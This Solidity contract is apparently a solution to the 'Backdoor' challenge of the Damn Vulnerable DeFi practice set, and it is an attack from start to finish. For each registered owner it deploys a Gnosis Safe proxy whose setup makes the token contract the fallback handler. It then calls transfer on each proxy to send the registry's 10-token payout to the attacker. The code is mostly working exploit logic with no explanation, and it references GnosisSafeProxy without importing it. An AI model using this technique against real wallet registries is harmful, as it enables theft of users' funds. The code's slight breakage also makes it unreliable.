pragma solidity 0.8.17;

import 'src/Contracts/backdoor/WalletRegistry.sol';
import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import 'forge-std/console.sol';
import 'src/Contracts/DamnValuableToken.sol';

contract BackdoorAttack {
  WalletRegistry public registry;
  GnosisSafeProxyFactory public walletFactory;
  GnosisSafe public masterCopy;
  address[] public owners;
  address payable public attacker;
  DamnValuableToken public token;

  constructor(address _registry, address _walletFactory, address _masterCopy, address[] memory _owners, address _token) {
    registry = WalletRegistry(_registry);
    walletFactory = GnosisSafeProxyFactory(_walletFactory);
    masterCopy = GnosisSafe(payable(_masterCopy));
    owners = _owners;
    token = DamnValuableToken(_token);
    attacker = payable(msg.sender);
  }

  function attack() public {
    for (uint256 i = 0; i < owners.length; i++) {
      address[] memory walletOwners = new address[](1);
      walletOwners[0] = owners[i];

      bytes memory initializer = abi.encodeWithSignature(
        "setup(address[],uint256,address,bytes,address,address,uint256,address)",
        walletOwners,
        1,
        address(0),
        "",
        address(token),
        address(0),
        0,
        address(0)
      );

      GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
        address(masterCopy),
        initializer,
        1,
        registry
      );

      (bool approveSuccess, ) = address(proxy).call(
        abi.encodeWithSignature("transfer(address,uint256)", attacker, 10 ether)
      );

      require(approveSuccess, "approve failed");
    }
  }
}
